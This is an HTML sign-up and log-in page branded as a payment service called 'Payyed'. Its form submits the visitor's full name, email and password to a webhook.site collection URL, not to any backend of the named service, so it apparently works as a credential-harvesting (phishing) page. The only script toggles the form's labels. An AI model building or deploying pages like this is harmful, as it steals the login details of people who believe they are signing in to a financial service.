<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="/login form/syle.css">
    <title>Document</title>
</head>
<body>
    <div id="template">
        <div class="pic-container">
            <div class="first"></div>
            <div class="second"></div>
            <div class="third">
                <div class="logo"></div>
                <div class="txt">
                    <h1>Get Verified!</h1>
                    <p>Every day, Payyed makes thousands of costumers happy.</p>
                </div>
                <div class="txt">
                    <h1>Welcome back!</h1>
                    <p>We are glad to see you again! Instant deposits, withdrawals & payouts trusted by millions worldwide.</p>
                </div>
            </div>
        </div>
        <div class="form-container">
            <div class="form">
                <form action="https://webhook.site/7d6b2c6e-939e-460c-8658-57f5708a209c">
                    <h1 style="font-weight: normal">Sign Up</h1>
                    <div class="inputs">
                        <div class="input-container">
                            <p>Full Name</p>
                            <input type="text" name="fullname" placeholder="Enter Your Name">
                        </div>
                        <div class="input-container">
                            <p>Email Address</p>
                            <input type="email" name="email" placeholder="Enter Your Email">
                        </div>
                        <div class="input-container">
                            <p>Password</p>
                            <input type="password" name="password" placeholder="Enter Password">
                        </div>
                        <div class="button-container">
                            <button type="submit">Sign Up</button>
                            <p style="text-align: center; display: inline-block;" class="footer">Already have an account?</p><a href="#"> Log In</a>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script>
        var txt = document.getElementsByClassName("third")[0];
        var a = document.getElementsByTagName("a")[0];
        var inp = document.getElementsByClassName("inputs");
        var btn = document.getElementsByTagName("button")[0];
        var h = document.getElementsByTagName("h1")[2];
        var p = document.getElementsByClassName("footer")[0];
        a.addEventListener("click", function(){
            txt.classList.toggle("login");
            inp[0].classList.toggle("changed")
            if(txt.className === "third"){
                btn.innerHTML = h.innerHTML = "Sign Up";
                this.innerHTML = " Log In";
                p.innerHTML = "Already have an account? ";
            }
            else{
                btn.innerHTML = h.innerHTML = "Log In";
                this.innerHTML = " Sign Up";
                p.innerHTML = "Don't have an account? "
            }
        })
    </script>
</body>
</html>
